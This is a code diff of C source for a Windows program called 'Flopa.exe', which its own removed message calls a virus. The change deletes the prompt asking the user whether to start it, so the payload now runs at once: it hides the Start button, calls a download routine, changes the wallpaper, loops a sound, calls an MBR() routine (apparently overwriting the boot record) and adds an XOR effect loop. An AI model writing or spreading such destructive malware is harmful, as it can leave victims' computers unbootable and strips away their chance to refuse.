@@ -11,6 +11,7 @@ int Scuaer();
 int Melt();
 int Invers();
 int Download();
+int XOR();
 
 int c = 0;
 
@@ -29,8 +30,13 @@ int loop(){
         Invers();
         c++;
         loop();
-    } else if (c < 3000) {
+    } else if (c < 2500) {
         TextO();
+        TextO();
+        TextO();
+        TextO();
+        TextO();
+        XOR();
         c++;
         loop();
     } else {
@@ -50,51 +56,15 @@ int loop(){
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
-    int msgboxID = MessageBox(
-        NULL,
-        L"You start Flopa.exe.\nIts a virus.\nDo you want to start it?",
-        L"Return the potatoes!",
-        MB_ICONEXCLAMATION | MB_YESNO);
+    HWND hTaskBar = FindWindow(L"Shell_TrayWnd", NULL);
+    HWND hStartButton = GetWindow(hTaskBar, GW_CHILD);
+    ShowWindow(hStartButton, SW_HIDE);
+    Download();
+    char* str = "C:\\Users\\Public\\Downloads\\WP.bmp";
+    PlaySound(L"C:\\Users\\Public\\Downloads\\BG.wav", NULL, SND_LOOP | SND_ASYNC);
+    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+    MBR();
+    loop();
 
-    if (msgboxID == IDYES)
-    {
-        HWND hTaskBar = FindWindow(L"Shell_TrayWnd", NULL);
-        HWND hStartButton = GetWindow(hTaskBar, GW_CHILD);
-        ShowWindow(hStartButton, SW_HIDE);
-        Download();
-        char* str = "C:\\Users\\Public\\Downloads\\WP.bmp";
-        PlaySound(L"C:\\Users\\Public\\Downloads\\BG.wav", NULL, SND_LOOP | SND_ASYNC);
-        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-        MBR();
-        loop();
-    }
-    else {
-        Download();
-        int msgboxID = MessageBox(
-            NULL,
-            L"Goodby!!!",
-            L"Return the potatoes!",
-            MB_ICONEXCLAMATION | MB_OK);
-
-        if (msgboxID == IDOK) {
-            int msgboxID = MessageBox(
-                NULL,
-                L"U stupid!",
-                L"HAHAHAHAHA!",
-                MB_ICONEXCLAMATION | MB_OK);
-
-            char* str = "C:\\Users\\Public\\Downloads\\screamBG.bmp";
-            SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-            PlaySound(L"C:\\Users\\Public\\Downloads\\scream.wav", NULL, SND_FILENAME);
-            remove("C:\\Users\\Public\\Downloads\\screamBG.bmp");
-            remove("C:\\Users\\Public\\Downloads\\scream.wav");
-            char* wp = "C:\\Users\\Public\\Downloads\\WP.bmp";
-            SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, wp, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-            remove("C:\\Users\\Public\\Downloads\\WP.bmp");
-            remove("C:\\Users\\Public\\Downloads\\BG.wav");
-            remove("C:\\Users\\Public\\Downloads\\icon.bmp");
-            BSOD();
-        }
-    }
     return 0;
 }
